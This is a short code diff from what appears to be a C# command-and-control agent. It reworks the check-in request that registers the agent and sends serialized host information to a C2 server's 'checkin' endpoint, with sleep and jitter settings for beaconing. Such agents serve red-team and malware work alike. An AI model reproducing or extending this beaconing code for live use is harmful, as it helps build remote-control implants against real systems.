@@ -48,17 +48,17 @@ var delay = baseConfig.Sleep;
 var jitter = baseConfig.Jitter;
 
 // Contact request 
-var request = new C2Request
+var registerRequest = new C2Request
 {
     AgentId = baseConfig.AgentId ?? string.Empty,
-    AgentStatus = AgentStatus.Stage1,
-    Reason = C2RequestReason.Register,
+    ConfigId = baseConfig.AgentConfigId ?? string.Empty,
+    AgentStatus = "active",
     Message = JsonSerializer.Serialize(agentInfo)
 };
 
 // Init contact request
 var baseCommunicationService = new CommunicationService(baseConfig);
-var registrationResult = await baseCommunicationService.SimplePostAsync("checkin", JsonSerializer.Serialize(request));
+var registrationResult = await baseCommunicationService.SimplePostAsync("checkin", JsonSerializer.Serialize(registerRequest));
 
 if (registrationResult is null)
 {
